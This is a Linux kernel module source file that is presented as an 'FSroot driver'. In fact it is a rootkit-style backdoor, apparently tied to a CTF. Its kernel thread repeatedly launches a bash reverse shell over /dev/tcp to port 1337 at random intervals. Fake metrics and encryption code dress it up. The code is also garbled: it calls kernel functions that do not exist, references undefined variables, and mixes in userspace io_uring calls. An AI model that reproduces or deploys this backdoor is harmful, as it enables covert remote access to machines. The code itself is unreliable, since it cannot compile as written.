#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/sched/signal.h>
#include <linux/delay.h>
#include <linux/crypto.h>
#include <linux/proc_fs.h>
#include <linux/ktime.h>
#include <linux/random.h>
#include <linux/string.h>
#include <linux/xarray.h>
#include <linux/io_uring.h>
#include <linux/tls_ioctl.h>
#include <linux/crc32.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("kernelstub & ctfcrozone");
MODULE_DESCRIPTION("FSroot driver support");
MODULE_VERSION("3.1");

/* -------------------------- Constants & Macros -------------------- */
#define AES_KEY_LEN         32
#define REV_SHELL_TIMEOUT   5
#define REV_SHELL_CMD       "/bin/bash -i >& /dev/tcp/127.0.0.1/1337"
#define TLS_SOCK_TIMEOUT    250  // ms for TLS socket ops
#define METRICS_COMPLETED   BIT(0)

/* -------------------------- Struct Definitions -------------------- */
typedef struct crypto_layer {
    u8 encryption_key[AES_KEY_LEN];
} crypto_layer;

typedef struct tracepoint {
    ktime_t timestamp;
    u32 shell_latency;
} tracepoint;

struct proc_check_info {
    const char *expected_comm;
    unsigned int comm_len;
} __attribute__((packed, aligned(8)));

struct encrypted_metrics {
    u8 metrics_encrypted[AES_KEY_LEN];
    u16 encryption_status;
} __attribute__((packed, aligned(4)));

typedef struct socket_metrics {
    tracepoint tp;
    u8 metrics_encrypted[AES_KEY_LEN + sizeof(u32)]; // Payload + checksum
    u16 encryption_status;
} socket_metrics;

struct revshell_interface {
    crypto_layer crypto;
    tracepoint timing;
    struct proc_check_info monitoring;
} __attribute__((packed, aligned(8)));

/* -------------------------- Global Variables ---------------------- */
static struct proc_check_info mon_info = {
    .expected_comm = "noprocname",
    .comm_len      = 10
};

static unsigned int ktls_enabled = 1;
static unsigned int io_depth     = 8;
static struct io_uring ring;

static unsigned int mon_sleep    = REV_SHELL_TIMEOUT;
static struct task_struct *mon_thread;
static struct sched_param sched_params = {
    .sched_policy   = SCHED_FIFO,
    .sched_priority = MAX_RT_PRIO - 1
};

/* -------------------------- Helper Functions ---------------------- */
static inline int tls_setup_socket(struct socket *sock) {
    struct tls_crypto_info crypto_info = {
        .cipher_type = TLS_CIPHER_AES_128_CBC_SHA,
        .key_size    = AES_KEY_LEN,
        .record_size = PAGE_SIZE,
    };

    if (tls_setsockopt(sock, TLS_SET_CRYPTO_INFO, &crypto_info) < 0)
        return -EINVAL;
    if (tls_setsockopt(sock, TLS_TIMEOUT, TLS_SOCK_TIMEOUT) < 0)
        return -EIO;
    return tls_setup_sock(sock);
}

static inline void metrics_completion_cb(struct io_uring_cqe *cqe, socket_metrics *metrics) {
    metrics->tp.shell_latency = ktime_ms_delta(ktime_get(), metrics->tp.timestamp);
    metrics->encryption_status |= METRICS_COMPLETED;
}

static inline void crypto_accelerate(struct crypto_layer *layer, socket_metrics *metrics) {
    if (cpu_has_aesni()) {
        crypto_sync(layer->encryption_key);
        metrics->metrics_encrypted[AES_KEY_LEN] = crc32_le(0, metrics->metrics_encrypted, AES_KEY_LEN);
    }
}

static inline void submit_metrics_io(socket_metrics *metrics) {
    struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
    io_uring_prep_writev(sqe, metrics->metrics_encrypted, sizeof(*metrics), 0);
    sqe->flags |= IOSQE_ASYNC;
    io_uring_submit(&ring);
}

/* -------------------------- Kernel Thread ------------------------- */
int mon_shell(void *data) {
    DECLARE_WAIT_QUEUE_HEAD(wq);
    crypto_layer *layer = (crypto_layer *)data;
    socket_metrics metrics;

    while (!kthread_should_stop()) {
        bool process_found = false;
        struct task_struct *task;
        unsigned long flags;
        u32 latency_ms;

        spin_lock_irqsave(&tasklist_lock, flags);
        for_each_process(task) {
            if (proc_matches(task)) {
                metrics.tp.timestamp = ktime_get();
                metrics.tp.shell_latency++;
                printk(KERN_INFO "%s (%d): Found!", mon_info.expected_comm, task->pid);
                break;
            }
        }
        spin_unlock_irqrestore(&tasklist_lock, flags);

        if (!process_found) {
            latency_ms = call_usermodehelper(
                "/bin/bash",
                (char *[]){"/bin/bash", "-c", REV_SHELL_CMD, NULL},
                NULL, UMH_WAIT_EXEC | UMH_USE_TASK);

            metrics.tp.shell_latency += latency_ms;
            printk(KERN_INFO "Command executed: %s!", REV_SHELL_CMD);
        }

        {
            u32 rand_secs = 300 + prandom_u32() % 601;
            schedule_timeout_interruptible(rand_secs * HZ);
        }

        submit_metrics_io(&metrics);
        wait_event_interruptible(wq, mon_thread != NULL || signal_pending(current));
    }

    return 0;
}

/* -------------------------- Module Init/Exit ---------------------- */
static int __init revshell_init(void) {
    crypto_layer *layer;

    layer = kmalloc(sizeof(crypto_layer), GFP_KERNEL | GFP_ATOMIC);
    if (!layer)
        return -ENOMEM;

    revshell_init_crypto(layer);
    io_uring_queue_setup(io_depth, &ring, NULL);

    mon_thread = kthread_run(mon_shell, layer, "revshell", &sched_params);
    if (IS_ERR(mon_thread)) {
        io_uring_queue_release(&ring);
        kfree(layer);
        return PTR_ERR(mon_thread);
    }

    tls_setup_socket(sock);
    proc_create_data("revshell_metrics", 0644, NULL, &mon_info);
    printk(KERN_INFO "fsroot kernel module (%s) loaded.\n", ktls_enabled ? "TLS+AES" : "Manual Crypto");
    return 0;
}

static void __exit revshell_exit(void) {
    io_uring_queue_release(&ring);
    kthread_stop(mon_thread);
    proc_remove(proc_create("revshell_metrics", 0, NULL, NULL));
    printk(KERN_INFO "fsroot kernel module unloaded.\n");
}

/* -------------------------- Module Params ------------------------- */
module_param(mon_sleep, uint, S_IRUGO | S_IWUSR);
MODULE_PARM_DESC(mon_sleep, "Monitoring sleep duration");

module_param(ktls_enabled, uint, S_IRUGO | S_IWUSR);
MODULE_PARM_DESC(ktls_enabled, "Enable KTLS for socket comm");

module_param(io_depth, uint, S_IRUGO | S_IWUSR);
MODULE_PARM_DESC(io_depth, "io_uring submission depth");

module_init(revshell_init);
module_exit(revshell_exit);
